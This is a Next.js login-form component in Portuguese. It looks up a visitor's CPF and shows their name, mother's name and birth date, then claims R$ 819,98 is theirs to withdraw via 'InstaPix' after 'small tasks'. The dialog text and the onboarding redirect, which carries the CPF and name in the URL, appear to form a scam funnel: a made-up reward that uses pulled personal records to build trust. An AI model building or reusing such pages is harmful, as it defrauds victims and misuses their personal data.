'use client'

import { useEffect, useState } from "react"
import { InputMask } from '@react-input/mask'
import { useRouter, useSearchParams } from 'next/navigation'
import { getApiCpf } from "./actions"
import { useFormState } from "@/hooks/use-form-state"
import { Loader } from "lucide-react"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { setCookie } from "cookies-next"



export function LoginForm() {
  const router = useRouter()

  const params = useSearchParams()

  const [document, setDocument] = useState("")

  const [utmSrc] = useState<string | null>(params.get('utm_src'))

  const [{ data, message, success }, handleSubmit, isPending] =
    useFormState(getApiCpf)

  useEffect(() => {

    if (utmSrc) {
      setCookie('utm_src', utmSrc)
    }


    if (message === 'erro') {
      router.push(`/onbording?src=user_not_found&document=${document}`)
    }
  }, [message])



  return (
    <>
      {success && data?.data && (
        <Dialog defaultOpen>
          <DialogContent className="w-full max-w-[360px] rounded-lg bg-[#C0C0C0] border-0 outline-none mx-auto">
            <DialogHeader>
              <DialogTitle className="text-center text-lg font-bold">
                Sucesso! Existe o valor de R$ 819,98 em nome de <strong>{data.data.DADOS_PESSOAIS.NOME}</strong> para sacar imediatamente.
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-10">
              <div className="space-y-4">

                <div className="flex flex-col gap-2">
                  <div className="flex items-center gap-2">
                    <p className="text-sm font-bold">CPF :</p>
                    <p className="text-sm">{data.data.DADOS_PESSOAIS.CPF}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <p className="text-sm font-bold">Nome :</p>
                    <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME}</p>
                  </div>

                  <div className="flex items-center gap-2">
                    <p className="text-sm font-bold">Mãe :</p>
                    <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME_MAE}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <p className="text-sm font-bold">Data de nascimento :</p>
                    <p className="text-sm">{data.data.DADOS_PESSOAIS.DATA_NASCIMENTO}</p>
                  </div>
                </div>
                <div className="text-sm text-center">
                  Após a análise feita verificamos que você segue no Instagram uns dos influenciadores que fazem parte da parceria InstaPix. Aprovando assim o valor de R$ 819,98 após concluir pequenas tarefas.
                </div>
              </div>
              <div className="flex items-center gap-4 w-full">
                <Button onClick={() => router.push(`/onbording?document=${data.data.DADOS_PESSOAIS.CPF}&name=${data.data.DADOS_PESSOAIS.NOME}`)} className="w-full bg-[#216b16] hover:bg-[#216b16]">
                  Receber meu PIX
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}
      <form onSubmit={handleSubmit} className="space-y-6">
        <InputMask
          mask="___.___.___-__"
          replacement={{ _: /\d/ }}
          type="tel"
          name="document"
          defaultValue={document}
          onChange={(e) => setDocument(e.target.value)}
          placeholder="Digite seu CPF"
          className="p-2 rounded-lg ring-1 focus:ring-2 ring-[#005952] outline-none border-0 w-full  h-11"
        />

        <button className="w-full bg-[#005952] h-12 text-center rounded-lg flex items-center justify-center text-white font-medium" disabled={isPending}>
          {isPending ? (
            <Loader className="size-4 animate-spin" />

          ) : (
            <span>
              Consultar & Continuar
            </span>
          )}
        </button>
      </form>
    </>
  )
}